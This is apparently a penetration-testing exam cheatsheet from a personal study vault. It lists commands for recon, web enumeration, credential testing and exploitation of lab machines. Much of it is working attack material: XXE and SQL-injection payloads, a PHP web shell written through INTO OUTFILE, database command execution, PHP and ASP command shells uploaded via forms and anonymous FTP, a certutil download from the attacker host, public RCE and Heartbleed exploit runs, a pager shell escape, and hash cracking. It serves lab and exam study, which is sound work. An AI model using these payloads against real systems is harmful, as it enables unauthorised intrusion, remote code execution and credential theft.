---
tags: [OSCP, Cheatsheet, Commands, Exam]
status: Maintained
last_audited: 2026-09-13
---

<!-- Living document: update after every box, module, or runbook change. -->
<!-- Last full vault audit: 2026-09-13. Sources: all maintained command appendices, RUNBOOK V2, exam runbooks, methodology, modern tooling, modules, and box evidence. -->
<!-- Use this as the speed sheet. Open the linked appendix or runbook when the branch needs explanation, caveats, or a longer procedure. -->

# CTRL+F ANYTHING

> [!tip] 💡 Starting a new box
> Open [[RUNBOOK V2/00 - Follow-Along Controller|RUNBOOK V2 Follow-Along Controller]]. It gives the exact order, output decisions, failure routes, exploit-editing lane, and closeout steps. Use this sheet when you already know the technique and need a command quickly.

> [!tip] 🛠️ Editing a public exploit
> Open [[RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]] before changing a PoC. It links the command, source-review, `nano` edit, syntax-check, payload, and troubleshooting sequence.

## 0. START HERE: WORKSPACE, VARIABLES & EVIDENCE

Every command below assumes the standard variables from [[CODEX CONTEXT]] and a box directory created by `boxstart`. Keep command output, screenshots, scans, and loot under `$BoxDir`.

```bash
# Initialise the standard workspace and logging helpers.
boxstart BoxName BoxIP htb

# Start or resume a complete transcript before a manual run.
htblog

# Confirm target, callback, domain, and workspace values before touching the box.
printf 'Target=%s\nLocal=%s\nDomain=%s\nFQDN=%s\nBoxDir=%s\n' \
  "$BoxIP" "$LocalIP" "$Domain" "$FQDN" "$BoxDir"

# Capture a scan's output without losing the terminal view.
nmap -Pn -n -sT -p "$OpenPorts" "$BoxIP" 2>&1 | tee "$BoxDir/loot/command-output.txt"

# Save a credential, hash, flag, key, or downloaded artifact through the vault helpers.
loot cred "$Username" "$Password"

loot hash "$Username" "$Hash"

loot flag user "$UserFlag"

loot key "$KeyFile"

loot file "$EvidenceFile"

# Take evidence screenshots and close the box only after cleanup is recorded.
shot proof-name

boxdone
```

> [!warning] 💡 Evidence rule
> A screenshot proves what was visible; it does not replace the command transcript. Keep the command, full output, error, artifact path, and cleanup action together in `$BoxDir`.

### Source-of-truth routing

Use the shortest page that answers the immediate question, then open the linked source when the branch needs explanation or a longer proof sequence.

| Need | Open |
|---|---|
| Blank-slate route and failure decisions | [[RUNBOOK V2/00 - Follow-Along Controller]] |
| Exact command families by topic | [[COMMAND APPENDIX/COMMAND APPENDIX]] |
| Why a command works or fails | [[COMMAND BREAKDOWNS/COMMAND BREAKDOWNS]] |
| “I found this; what next?” routing | [[DECISION TREE/DECISION TREE]] |
| OSCP phase methodology | [[METHODOLOGY CHEAT SHEET/METHODOLOGY CHEAT SHEET]] |
| Current tool syntax and caveats | [[MODERN TOOLING/MODERN TOOLING]] |
| Fast exam execution route | [[EXAM RUNBOOK/Index]] |
| Box-specific evidence and gotchas | [[BOXES/WRITE UPS/WRITE UPS]] |

## 1. RECON & PORT SCANNING

```bash
# Full TCP scan
sudo nmap -Pn -n -sT -p- --min-rate 5000 $BoxIP -oN nmap/${BoxName}_allports.txt

# Service and default-script scan
sudo nmap -sC -sV -p $Port $BoxIP -oA nmap/${BoxName}_services

# Common UDP ports
sudo nmap -sU --top-ports 100 $BoxIP -oN nmap/${BoxName}_udp.txt

# Scan selected web ports with HTTP scripts
nmap -p 80,443,8080,8443 --script http-* $BoxIP

# SMB checks
nmap -p 445 --script smb-vuln* $BoxIP

smbclient -N -L //$BoxIP

enum4linux -a $BoxIP

smbmap -H $BoxIP

# RPC and NFS
rpcclient -U "" -N $BoxIP

showmount -e $BoxIP

mount -t nfs $BoxIP:/export /mnt/nfs -o nolock

# SNMP
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt $BoxIP

snmpwalk -v2c -c public $BoxIP

snmpwalk -v1 -c public -On $BoxIP 1.3.6.1.2.1.1 | tee "$BoxDir/loot/snmp-system.txt"

awk -F' - ' '/IKE VPN password PSK/ {print $2; exit}' "$BoxDir/loot/snmp-system.txt" > "$BoxDir/loot/psk.hash"

snmp-check $BoxIP

# IKE fingerprinting and IPSec transport mode
sudo ike-scan -M "$BoxIP" | tee "$BoxDir/loot/ike-scan.txt"

sudo ss -ulnp | grep ":$IKEPort" || true

sudo ipsec stop 2>/dev/null || true

cat > "$BoxDir/ipsec.conf" <<EOF
config setup
    uniqueids=no
    charondebug="ike 2, knl 2, cfg 2"

conn $BoxName
    keyexchange=ikev1
    authby=secret
    type=transport
    left=%defaultroute
    right=$BoxIP
    rightsubnet=$BoxIP[tcp]
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    auto=start
EOF

cat > "$BoxDir/ipsec.secrets" <<EOF
%any %any : PSK "$Password"
EOF

chmod 600 "$BoxDir/ipsec.secrets"

sudo unshare --mount --propagation private bash -lc \
  "mount --bind '$BoxDir/ipsec.secrets' /etc/ipsec.secrets && \
   exec /usr/lib/ipsec/starter --nofork --conf '$BoxDir/ipsec.conf'" \
  2>&1 | tee "$BoxDir/loot/ipsec-start.txt" &

sudo ip xfrm policy

sudo ip xfrm state

sudo nmap -Pn -n -sT -sV --version-light -p "$OpenPorts" \
  -oA "$BoxDir/nmap/post-ipsec" "$BoxIP"

# FTP and SMTP
ftp $BoxIP

nc $BoxIP 25

# Check FTP anonymously and show the directory listing
curl -s ftp://anonymous:@$BoxIP/

curl --ftp-pasv --user anonymous:anonymous --list-only "ftp://$BoxIP/"

# Test whether an anonymous FTP write is served by IIS under a different URL path
printf '%s\n' 'test' | curl --ftp-pasv --user anonymous:anonymous \
  --upload-file - "ftp://$BoxIP/test.txt"
curl -sS "http://$BoxIP/upload/test.txt"

# Test SMTP banner and supported commands
nc -nv $BoxIP 25

nikto -host http://$BoxIP -Tuning b

dig axfr $Domain @$BoxIP

dnsrecon -d $Domain -t std

smtp-user-enum -M RCPT -U $Userlist -D $Domain -t $BoxIP
```

### Passive recon, DNS and visual triage

```bash
# Ownership and registration clues.
whois "$Domain"

# Passive subdomain discovery.
subfinder -d "$Domain" -silent -o "$BoxDir/loot/subfinder.txt"

sublist3r -d "$Domain" -o "$BoxDir/loot/sublist3r.txt"

# DNS records and zone-transfer test.
host -t any "$Domain" "$BoxIP"

dig "$Domain" ANY @"$BoxIP"

dig axfr "$Domain" @"$BoxIP"

dnsenum "$Domain" --threads 100

# Generate a targeted wordlist from the public site, then review it before fuzzing.
cewl -d 2 -m 5 -w "$BoxDir/loot/cewl.txt" "http://$BoxIP/"

# Enumerate common hostnames with the current domain suffix.
gobuster dns -d "$Domain" -w "$Wordlist" -o "$BoxDir/loot/dns.txt"

# Capture a visual inventory of discovered web services.
awk '/^https?:\/\// {print}' "$BoxDir/loot/urls.txt" | aquatone -out "$BoxDir/loot/aquatone"
```

> [!warning] 💡 Passive-tool gotcha
> `subfinder`, `sublist3r`, and `whois` are most useful when the target is in scope for passive lookup. A failed zone transfer is expected on many hosted DNS providers; preserve the response and continue with direct records and vhost testing.

### Cloud and CI/CD triage

```bash
# Use named AWS profiles so identities and evidence do not get mixed.
aws configure --profile "$AwsProfile"

aws sts get-caller-identity --profile "$AwsProfile" --no-cli-pager

# S3 public-read and direct-object checks.
aws s3 ls "s3://$BucketName/" --profile "$AwsProfile" --no-cli-pager

aws s3 cp "s3://$BucketName/$ObjectKey" "$BoxDir/loot/$File" --profile "$AwsProfile"

cloud_enum -k "$BucketName" --quickscan --disable-azure --disable-gcp

# EC2/IAM evidence collection.
aws ec2 describe-images --executable-users all --profile "$AwsProfile" --no-cli-pager

aws ec2 describe-snapshots --owner-ids "$AccountID" --profile "$AwsProfile" --no-cli-pager

aws iam get-account-authorization-details --filter User Group Role \
  --profile "$AwsProfile" --no-cli-pager > "$BoxDir/loot/iam-dump.json"

# Read large JSON responses without printing unrelated secrets.
jq '.UserDetailList[] | {user: .UserName, groups: .GroupList, attached: [.AttachedManagedPolicies[].PolicyName]}' \
  "$BoxDir/loot/iam-dump.json"

# Start Pacu only when the route calls for an AWS exploitation framework.
pacu
```

```text
# Inside Pacu: import, confirm, enumerate, and export the active session.
import_keys $AwsProfile

whoami

services

data IAM

run iam__enum_users_roles_policies_groups

export_keys
```

> [!warning] 💡 Cloud gotcha
> `AccessDenied` can mean a real resource with insufficient permissions, not a nonexistent resource. Preserve the exact response, distinguish the active AWS profile from Pacu's active keys, and keep cloud credentials out of screenshots.

### Common application fingerprints

```bash
# WordPress, Joomla, Drupal, Tomcat, and IIS version clues.
wpscan --url "http://$BoxIP/" --enumerate u,vp,vt

curl -sS "http://$BoxIP/wp-json/wp/v2/users" -o "$BoxDir/loot/wp-users.json"

curl -sS "http://$BoxIP/README.txt" | head

curl -sS "http://$BoxIP/CHANGELOG.txt" | grep -m1 -i drupal

curl -sS "http://$BoxIP:8080/nonexistent" | head

curl -sS -I "http://$BoxIP/Documentation/"

# IIS short-name enumeration and follow-up discovery.
java -jar "$BoxDir/tools/iis_shortname_scanner.jar" 0 5 "http://$BoxIP/"

gobuster dir -u "http://$BoxIP/" -w "$Wordlist" -x asp,aspx,php,txt

# Management applications and exposed project history.
curl -k -sS -I "https://$BoxIP:8000/"

git -C "$GitRepo" log --all --oneline
```

> [!tip] ⚡ Fingerprint first
> Version disclosure, a login panel, a readable changelog, a manager endpoint, or a short-name result is a routing clue. Save the response, then open the matching application appendix before selecting an exploit.

### PostgreSQL service triage

```bash
# Identify the banner and attempt the documented default account.
nc -nv "$BoxIP" "$Port"

psql -h "$BoxIP" -p "$Port" -U postgres -d postgres

# Enumerate databases, users, and privileges after authentication.
psql -h "$BoxIP" -p "$Port" -U "$Username" -d postgres -c '\l'

psql -h "$BoxIP" -p "$Port" -U "$Username" -d postgres -c '\du'

psql -h "$BoxIP" -p "$Port" -U "$Username" -d postgres -c 'SELECT current_user, session_user, version();'

psql -h "$BoxIP" -p "$Port" -U "$Username" -d postgres -c 'SELECT datname FROM pg_database;'
```

## 2. WEB ENUMERATION

```bash
# Fingerprint and headers
whatweb http://$BoxIP

curl -I http://$BoxIP

curl -s http://$BoxIP/robots.txt

curl -s http://$BoxIP/sitemap.xml

# Directories and parameters
gobuster dir -u http://$BoxIP -w $Wordlist -x php,html,txt

feroxbuster -u http://$BoxIP/ -w $Wordlist -x php,txt,html -t 40

ffuf -u http://$BoxIP/FUZZ -w $Wordlist

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://$BoxIP/index.php?FUZZ=test" -fs 0 -t 50 -s

# WordPress
wpscan --url http://$BoxIP --enumerate u,vp,vt

# WordPress REST users and an exposed plugin browser
curl -sS --max-time 60 "http://$BoxIP/index.php/wp-json/wp/v2/users" \
  -o "$BoxDir/loot/wp-users.json"

python3 -m json.tool "$BoxDir/loot/wp-users.json"

curl -sS --max-time 60 "http://$BoxIP/plugins/" \
  -o "$BoxDir/loot/plugins.html"

curl -sS --max-time 60 "http://$BoxIP/plugins/scan.php" \
  | tee "$BoxDir/loot/plugins-scan.json"

# Preserve timing before treating a slow dynamic endpoint as a VPN failure
curl -sS --max-time 60 -o /dev/null \
  -w 'code=%{http_code} connect=%{time_connect} start=%{time_starttransfer} total=%{time_total}\n' \
  "http://$BoxIP:$WebPort/$Path"

# Full route: Blocky timing and plugin artifact example

# Save a raw response
curl -s "http://$BoxIP/$Path" -o $ResponseFile

# Download and inspect a disclosed source archive before testing its handlers
curl -sS "http://$BoxIP/backup/backup.tar" -o "$BoxDir/loot/backup.tar"

tar -tvf "$BoxDir/loot/backup.tar"

mkdir -p "$BoxDir/loot/source"

tar -xf "$BoxDir/loot/backup.tar" -C "$BoxDir/loot/source"

grep -RniE 'upload|move_uploaded_file|exec\(|system\(|cron|filename|mime' "$BoxDir/loot/source"

# Route requests through Burp
curl --proxy 127.0.0.1:8080 http://$BoxIP/$Path

# LFI baseline and PHP source disclosure
curl -sG "http://$BoxIP/$Path" --data-urlencode "file=/etc/passwd"

curl -sG "http://$BoxIP/$Path" --data-urlencode "file=php://filter/convert.base64-encode/resource=$File" | base64 -d

# Save a long encoded response, then decode it without printing the result
curl -s "http://$BoxIP/$Path" -o "$BoxDir/loot/raw_response.txt"

python3 - "$BoxDir/loot/raw_response.txt" "$BoxDir/loot/decoded.txt" <<'PY'
import base64, sys
from pathlib import Path
src, dst = map(Path, sys.argv[1:])
value = b"".join(src.read_bytes().splitlines()[2:])
for _ in range(13):
    value = base64.b64decode(value)
dst.write_bytes(value)
PY
```

See [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]], [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]], and [[OSCP/RUNBOOK V2/Linux - Binary Analysis|Linux - Binary Analysis]] for the complete web-to-artifact route.

### Virtual hosts

```bash
# Test candidate hostnames against the target while preserving the full domain
gobuster vhost -u http://$Domain -w $VHostWordlist --append-domain -o $BoxDir/loot/vhosts.txt

# Route a confirmed virtual host to the target IP
echo "$BoxIP $VHost" | sudo tee -a /etc/hosts

curl -i -H "Host: $VHost" http://$BoxIP/
```

### Burp, ZAP, source and WebDAV helpers

```bash
# Launch the intercepting proxy and route a request through it.
burpsuite &

curl --proxy http://127.0.0.1:8080 -k -sS "https://$FQDN/$Path"

# Start OWASP ZAP when an automated baseline or active scan is appropriate.
zap.sh -daemon -host 127.0.0.1 -port 8080

# Serve a WebDAV tree for an authorised client-side delivery test.
mkdir -p "$BoxDir/www/webdav"

wsgidav --host=0.0.0.0 --port="$WebPort" --auth=anonymous --root="$BoxDir/www/webdav"

# Search Git history for credentials that are absent from the current tree.
gitleaks detect --source "$GitRepo" --report-format json --report-path "$BoxDir/loot/gitleaks.json"

git -C "$GitRepo" log --all --oneline
```

> [!warning] 💡 Proxy gotcha
> Burp and ZAP cannot both bind the same local port. Keep one proxy listener active, export the request from browser or proxy history, and replay one changed field at a time.

### Client-side delivery and phishing lab helpers

```bash
# Capture a rendered login page for an authorised client-side test.
single-file "https://$FQDN/" "$BoxDir/www/signin.html" --browser-executable-path /usr/bin/chromium

# Serve a WebDAV tree for a Windows library-file test.
wsgidav --host=0.0.0.0 --port="$WebPort" --auth=anonymous --root="$BoxDir/www/webdav"

# Send a test message with an attachment through an in-scope SMTP service.
swaks --to "$Username@$Domain" --from "$Username@$Domain" --server "$BoxIP" \
  --header "Subject: $Subject" --body "$BoxDir/www/message.txt" \
  --attach "$BoxDir/www/$File"

# RDP with clipboard and a loot drive mapped into the session.
xfreerdp /v:"$BoxIP" /u:"$Username" /p:"$Password" \
  +clipboard /drive:loot,"$BoxDir/loot" /cert:ignore
```

> [!warning] 💡 Client-side gotcha
> Keep delivery artifacts, capture servers, and callbacks inside the authorised lab scope. A cloned page or library file is not evidence until the request reaches the expected listener and the resulting identity is validated.

## 3. DEFAULT CREDS & AUTH TESTING

```bash
# HTTP form testing
curl -i -s -c $CookieFile -d "username=$Username&password=$Password" http://$BoxIP/

curl -i -s -b $CookieFile -c $CookieFile -L http://$BoxIP/home.php

# Properly encode special form values
curl -X POST --data-urlencode "username=$Username&password=$Password" http://$BoxIP/login.php

# SMB anonymous and authenticated checks
smbclient -N -L //$BoxIP

smbclient //$BoxIP/$Share -U "$Username%$Password"

# Download an anonymously readable AD Replication policy tree for offline GPP review
smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; mget *'

# Recover a GPP-managed password from a downloaded Groups.xml without placing it in the command text
gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | awk -F'\"' '{print $1}')"

# SSH and FTP authentication
ssh $Username@$BoxIP

ftp $BoxIP

# IoT product fingerprint and controlled factory-credential validation
curl -sS -i "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/http-root.txt"

curl -sS -L "http://$BoxIP:$WebPort/admin/" | tee "$BoxDir/loot/http-admin.html"

grep -Ein 'product|version|firmware|login|admin|pi-hole' \
  "$BoxDir/loot/http-root.txt" "$BoxDir/loot/http-admin.html"

ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  -p "$SshPort" "$Username@$BoxIP"

id

whoami

hostname

# Mounted-media metadata only. Do not print private completion files.
mount | grep -E '/media|/mnt|/dev/sd'

lsblk -f

df -h

ls -la "$UsbMount"

file -s "$UsbDevice"

stat "$UsbMount"/* 2>/dev/null

# PostgreSQL default login
psql -h $BoxIP -p $Port -U postgres

mysql -u $Username -p$Password -h $BoxIP -P $Port

# Test PostgreSQL on a non-standard port with the documented default account
psql -h $BoxIP -p $Port -U postgres -d postgres

# FreeBSD local listener and process checks after an SSH foothold
netstat -an

ps aux | grep -i vnc

# Retrieve and inspect a credential-bearing archive without printing its contents
scp "$Username@$BoxIP:/home/$Username/secret.zip" "$BoxDir/loot/secret.zip"

unzip -l "$BoxDir/loot/secret.zip"

unzip -P "$Password" "$BoxDir/loot/secret.zip" -d "$BoxDir/loot/secret-dir"
```

### Username generation, targeted lists and controlled authentication

```bash
# Generate common username forms from a first and last name.
./username-anarchy FirstName LastName > "$BoxDir/loot/usernames.txt"

# Generate an OSINT-based password list, then filter it to the observed policy.
cupp -i

grep -E '^.{6,}$' "$PasswordList" \
  | grep -E '[A-Z]' \
  | grep -E '[a-z]' \
  | grep -E '[0-9]' \
  | grep -E '([!@#$%^&*].*){2,}' \
  > "$BoxDir/loot/passwords-filtered.txt"

# Test one known password against an in-scope username list and stop on success.
netexec smb "$BoxIP" -u "$BoxDir/loot/usernames.txt" \
  -p "$Password" --continue-on-success

# Throttle a CSRF-aware form attack only after the request and failure marker are confirmed.
patator http_fuzz url="http://$BoxIP/$Path" method=POST \
  body='username=FILE0&password=FILE1' \
  0="$BoxDir/loot/usernames.txt" 1="$BoxDir/loot/passwords.txt" \
  -x ignore:fgrep="$FailureString"
```

> [!warning] 💡 Authentication gotcha
> Use password spraying for one known password across a small, valid account set; use dictionary attacks only when the box and rules permit them. Confirm lockout policy, username format, failure text, redirects, and rate limits first.

## 4. WEB VULNERABILITIES

### XXE

```bash
curl -s -b $CookieFile -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
  "http://${BoxIP}:${WebPort}/process.php"

# Windows file read
curl -s -b $CookieFile -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
  "http://${BoxIP}:${WebPort}/process.php"

# Extract an SSH key from a saved response
awk '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/' $ResponseFile \
  | sed -e 's/^.*\(-----BEGIN OPENSSH PRIVATE KEY-----\)/\1/' \
        -e 's/\(-----END OPENSSH PRIVATE KEY-----\).*/\1/' > $KeyFile

chmod 600 $KeyFile

ssh-keygen -y -f $KeyFile
```

### Multipart XML upload, Python pickle, and Git-history credentials

```bash
# Preserve the form and confirm the multipart field before testing XXE
boxset UploadURL "http://$BoxIP:$WebPort/upload"

boxset FileField "file"

curl -sS "$UploadURL" | tee "$BoxDir/loot/upload.txt"

curl -sS -F "$FileField=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml" \
  "$UploadURL" | tee "$BoxDir/loot/xxe-passwd.txt"

# Source-driven pickle proof: match the endpoint decoder and start with id
boxset PickleURL "http://$BoxIP:$WebPort/newpost"

Payload="$(python3 "$BoxDir/exploits/mkpickle.py" id)"

curl -sS -X POST --data-binary "$Payload" \
  -H 'Content-Type: application/octet-stream' "$PickleURL" \
  | tee "$BoxDir/loot/pickle-id.txt"

# Search every reachable Git commit and save a historical blob privately
git -C "$GitRepo" log --oneline --all

git -C "$GitRepo" show "$Commit:$HistoryPath" > "$HistoryKeyFile"

chmod 600 "$HistoryKeyFile"

ssh-keygen -y -f "$HistoryKeyFile" > /dev/null
```

Read the response for reflected `/etc/passwd` content, `uid=` from the pickle proof, and a successful `ssh-keygen` validation. Keep key contents and authentication material in private loot.

Seen in [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]].

### SQLI

```bash
# Form value with special characters
curl -s -X POST --data-urlencode "username=' || 1=1#" -d "password=anything" -L http://$BoxIP/login.php

# Error, UNION, and time checks
# Numeric UNION SQLi: map visible columns and enumerate MariaDB metadata
curl -G "http://$BoxIP/$Path" --data-urlencode "cod=-1 UNION SELECT 1,2,3,4,5,6,7-- -"

curl -G "http://$BoxIP/$Path" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -"

curl -G "http://$BoxIP/$Path" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='room'-- -"

# MySQL file write: place a PHP command shell in a writable web root
curl -G "http://$BoxIP/$Path" --data-urlencode "cod=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4,5,6,7 INTO OUTFILE '/var/www/html/$File'-- -"

# Magento Shoplift SQLi: manually reproduce the stacked-query admin insert after reviewing the PoC
python3 $BoxDir/exploits/shoplift_py3.py

curl -G "http://$BoxIP/$Path" --data-urlencode "id=1'"

curl -G "http://$BoxIP/$Path" --data-urlencode "id=1' UNION SELECT NULL,NULL-- -"

time curl -s -X POST "http://$BoxIP/$Path" -d "${Parameter}=1;SELECT SLEEP(5)#"
```

### SQLi database execution

```sql
CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text);

COPY (SELECT '') TO PROGRAM 'ping -c 4 $LocalIP';

COPY cmd_exec FROM PROGRAM '$Command';

SELECT * FROM cmd_exec;

DROP TABLE cmd_exec;

# PostgreSQL superuser command execution through COPY
COPY (SELECT '') TO PROGRAM 'id > /tmp/db-id.txt';

# MySQL UDF command execution when the plugin is writable
SELECT sys_exec('id > /tmp/mysql-id.txt');
```

### LFI / RFI

```bash
# Preserve traversal characters
curl --path-as-is "http://$BoxIP/$Path?file=../../../../etc/passwd"

curl -s "http://$BoxIP/$Path?img=php://filter/convert.base64-encode/resource=$File" | base64 -d

# URL-encoded data wrapper payload
PAYLOAD=$(echo -n '<?php echo shell_exec("id"); ?>' | base64 -w0 | sed 's/+/%2B/g')

curl -s "http://$BoxIP/$Path?img=data://text/plain;base64,$PAYLOAD"

unzip -l $File

# Read PHP source without executing it
curl -s "http://$BoxIP/$Path?file=php://filter/convert.base64-encode/resource=$Config" | base64 -d

# Confirm command execution through a data wrapper
curl -s "http://$BoxIP/$Path?file=data://text/plain;base64,$PAYLOAD"

# Poison: LFI and disclosed file listing
curl -sG "http://$BoxIP/browse.php" --data-urlencode "file=/etc/passwd"

curl -s "http://$BoxIP/listfiles.php"
```

### FILE UPLOAD

```bash
curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$File" -F "submit=Upload"

curl -s "http://$BoxIP/$UploadedPath"

# Networked: image/PHP polyglot with a second extension
curl -sS -i -X POST "http://$BoxIP/upload.php" -F "myFile=@$File;filename=networked.php.jpg" -F 'submit=go!'

boxset Path "uploads/$(printf '%s' "$LocalIP" | tr . _).php.jpg"

# Nibbleblog 4.0.3 authenticated My Image plugin upload, then trigger the renamed PHP file
curl -s -b $CookieFile -F 'plugin=my_image' -F 'title=My image' -F 'position=4' -F 'caption=' -F 'image=@$PayloadFile;type=application/x-php' -F 'image_resize=1' -F 'image_width=230' -F 'image_height=200' -F 'image_option=auto' "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"

curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"

# Upload a plugin or archive with the required multipart field
curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$BoxDir/$Archive" -F "submit=Upload"

# Enumerate an archive layout before using it as a CMS plugin or theme
unzip -l $BoxDir/$Archive

# Love: authenticated Voting System 1.0 voter-photo upload
cat > "$BoxDir/exploits/probe.php" <<'EOF'
<?php echo shell_exec($_GET["cmd"]); ?>
EOF

curl -sS -i -b "$CookieFile" \
  -F "photo=@$BoxDir/exploits/probe.php;type=image/png" \
  --form-string 'firstname=a' --form-string 'lastname=b' \
  --form-string 'password=1' --form-string 'add=' \
  "http://$BoxIP/Admin/voters_add.php"

curl -sS -G --data-urlencode 'cmd=whoami' \
  "http://$BoxIP/images/probe.php"
```

The upload redirect is not proof of execution. Verify the calculated `/images/probe.php` path and look for the web-service identity. The multipart MIME type is declared as an image while the filename remains PHP, matching the reviewed handler behavior. Seen in [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]].

### ANONYMOUS FTP TO IIS CLASSIC ASP

```bash
# Confirm the FTP root to IIS URL mapping with a harmless marker
printf '%s\n' 'test' | curl --ftp-pasv --user anonymous:anonymous \
  --upload-file - "ftp://$BoxIP/test.txt"
curl -sS "http://$BoxIP/upload/test.txt"

# Upload a minimal classic ASP command shell after the mapping is confirmed
cat > "$BoxDir/www/cmd.asp" <<'EOF'
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
EOF

curl --ftp-pasv --user anonymous:anonymous \
  --upload-file "$BoxDir/www/cmd.asp" "ftp://$BoxIP/cmd.asp"
curl -sS -G --data-urlencode 'cmd=whoami' \
  "http://$BoxIP/upload/cmd.asp"

# Transfer a reviewed Windows binary through the confirmed ASP shell
curl -sS -G --data-urlencode \
  "cmd=certutil.exe -urlcache -split -f http://$LocalIP:$ListenPort/$File C:\\Windows\\Temp\\$File" \
  "http://$BoxIP/upload/cmd.asp"
```

### Custom dotfile and SSH-key exposure

```bash
# Read robots.txt on an unusual HTTP service and save exposed history/key files as loot
curl -i http://$BoxIP:$WebPort/robots.txt

gobuster dir -u http://$BoxIP:$WebPort/ -w $Wordlist -x txt,py,html -t 30 -o $BoxDir/nmap/gobuster.txt

curl -s http://$BoxIP:$WebPort/.bash_history -o $BoxDir/loot/bash_history.txt

curl -s http://$BoxIP:$WebPort/.ssh/id_rsa -o $KeyFile
```

### NOSTROMO 1.9.6 RCE AND PROTECTED SSH ARCHIVE

```bash
# Review and copy the standalone CVE-2019-16278 proof of concept
searchsploit nostromo 1.9.6

searchsploit -x 47837

searchsploit -m 47837

mkdir -p $BoxDir/exploits

cp 47837.py $BoxDir/exploits/nostromo-47837.py

sed -i 's/^cve2019_16278\.py$/# cve2019_16278.py/' $BoxDir/exploits/nostromo-47837.py

python2 -m py_compile $BoxDir/exploits/nostromo-47837.py

# Prove command execution before requesting a callback
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort "id"

# Read the Nostromo configuration and extract the Basic-auth record privately
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
  "cat /var/nostromo/conf/nhttpd.conf"

python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
  "cat /var/nostromo/conf/.htpasswd" > $BoxDir/loot/htpasswd-response.txt 2>&1

sed -n '/^david:/p' $BoxDir/loot/htpasswd-response.txt > $BoxDir/loot/htpasswd.hash

john --wordlist=$Wordlist $BoxDir/loot/htpasswd.hash

# Authenticate once to download and inspect the protected archive
curl -fsS -u "$Username:$Password" \
  "http://$BoxIP/~$Username/protected-file-area/backup-ssh-identity-files.tgz" \
  -o $BoxDir/loot/backup-ssh-identity-files.tgz

tar -tzf $BoxDir/loot/backup-ssh-identity-files.tgz

tar -xzf $BoxDir/loot/backup-ssh-identity-files.tgz -C $BoxDir/loot/

# Crack the encrypted SSH key offline, then validate SSH access
ssh2john $BoxDir/loot/home/$Username/.ssh/id_rsa > $BoxDir/loot/$Username-id-rsa.john

john --wordlist=$Wordlist $BoxDir/loot/$Username-id-rsa.john

chmod 600 $BoxDir/loot/home/$Username/.ssh/id_rsa

ssh -i $BoxDir/loot/home/$Username/.ssh/id_rsa \
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  $Username@$BoxIP
```

### ARGUMENT-SPECIFIC JOURNALCTL PAGER ESCAPE

```bash
# Read the user-owned helper to capture the exact sudo arguments
sed -n '1,240p' /home/$Username/bin/server-stats.sh

sudo -n /usr/bin/journalctl -n5 -unostromo.service

# Inside the pager, enter: !/bin/bash
id

whoami
```

### HEARTBLEED AND ENCRYPTED SSH KEYS

```bash
# Confirm the TLS memory-disclosure condition with Nmap
sudo nmap -Pn -n -p $SSLPort --script ssl-heartbleed -oA $BoxDir/nmap/ssl-heartbleed $BoxIP

# Review and copy a public proof of concept, then save its output as private loot
searchsploit -x 32764

searchsploit -m 32764

python2 $BoxDir/exploits/heartbleed-32764.py $BoxIP -p $SSLPort > $BoxDir/loot/heartbleed-output.txt

# Search repeated captures locally for printable candidate material
strings -a -n 8 $BoxDir/loot/heartbleed-loop.txt | grep -v '^0x'

# Convert an exposed space-separated hex key representation to a protected key file
xxd -r -p $BoxDir/loot/hype_key $BoxDir/loot/hype_key.decoded

chmod 600 $BoxDir/loot/hype_key.decoded

ssh-keygen -y -f $BoxDir/loot/hype_key.decoded > /dev/null
```

### TMUX SESSION ACCESS THROUGH A UNIX SOCKET

```bash
find / -type s -ls 2>/dev/null

ls -la $SocketDir

tmux -S $TmuxSocket ls

tmux -S $TmuxSocket attach-session -t 0

id
```

### COMMAND INJECTION

```bash
curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=id"

curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=$Command"

# PHP web-shell command parameter, preserving shell metacharacters in the form body
curl -sS -X POST --data-urlencode 'cmd=id' "http://$BoxIP/$Path"

curl -sS -X POST --data-urlencode "cmd=$Command" "http://$BoxIP/$Path"

# Networked: inspect the cron source and wait for the scheduled execution
curl -sS -G --data-urlencode 'cmd=cat /home/guly/crontab.guly' "http://$BoxIP/$Path"

